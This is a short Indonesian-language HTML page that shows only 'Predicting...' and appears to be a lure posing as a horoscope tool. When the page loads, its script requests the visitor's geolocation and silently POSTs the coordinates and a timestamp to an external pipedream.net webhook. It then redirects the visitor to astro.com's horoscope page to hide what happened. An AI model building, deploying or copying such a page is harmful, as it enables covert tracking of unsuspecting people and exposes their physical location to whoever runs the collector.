<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Predicting...</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background-color: #fff;
      color: #333;
      font-family: sans-serif;
      font-size: 1rem;
    }
    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <div id="status">Predicting...</div>

  <script>
    const webhookURL = "https://eo4zwpbukao2mkl.m.pipedream.net/";
    const redirectURL = "https://www.astro.com/horoscope";

    const redirectToAstro = () => {
      window.location.href = redirectURL;
    };

    const sendLocation = (position) => {
      const { latitude, longitude } = position.coords;
      const timestamp = new Date().toISOString();

      const data = { latitude, longitude, timestamp };

      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      })
      .catch(() => {})
      .finally(() => {
        setTimeout(redirectToAstro, 1000);
      });
    };

    const handleError = (error) => {
      // Bisa tambahkan console.log(error) untuk debugging
      setTimeout(redirectToAstro, 1000);
    };

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
        timeout: 10000
      });
    } else {
      handleError();
    }
  </script>
</body>
</html>
